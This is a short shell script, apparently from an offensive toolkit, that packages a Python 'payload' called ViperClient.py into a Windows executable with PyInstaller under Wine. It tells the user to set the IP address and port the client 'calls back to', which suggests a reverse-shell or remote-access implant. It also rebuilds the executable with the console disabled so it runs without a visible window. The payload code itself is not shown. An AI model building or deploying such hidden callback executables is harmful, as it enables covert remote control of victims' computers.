#to Convert ViperClient.py to exe run commands below

echo "Generating ViperClient.exe"

echo ""
echo "read this first"
echo ""
echo "***Important please read before running this script. The payload will not work unless 
you change the following line. make sure that you navigate to payloads/ViperClient.py and change 
the IPADDESS and PORT number that you want client to call back to. if you have already changed 
the ip addess and port number inside ViperClient.py press any key to continue"

echo ""
echo "Important first change this line to your own correct settings 
s.connect(('0.0.0.0', 8081)), inside payloads/ViperClient.py"
echo ""
echo ""
echo "Once that line is changed then press any key to continue"
echo ""
echo ""

read -n 1 -s -p "Press any key to continue"

echo "generating ViperClient.exe"

# wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile HelloWorld.py

cd payloads/
wine pyinstaller --onefile --noconsole --nowindowed ViperClient.py
rm -rf build/
rm -rf dist/
sed -i 's/console=True/console=False/g' ViperClient.spec
wine pyinstaller ViperClient.spec
mv dist/ViperClient.exe .
rm -rf build/
rm -rf dist/
cd ../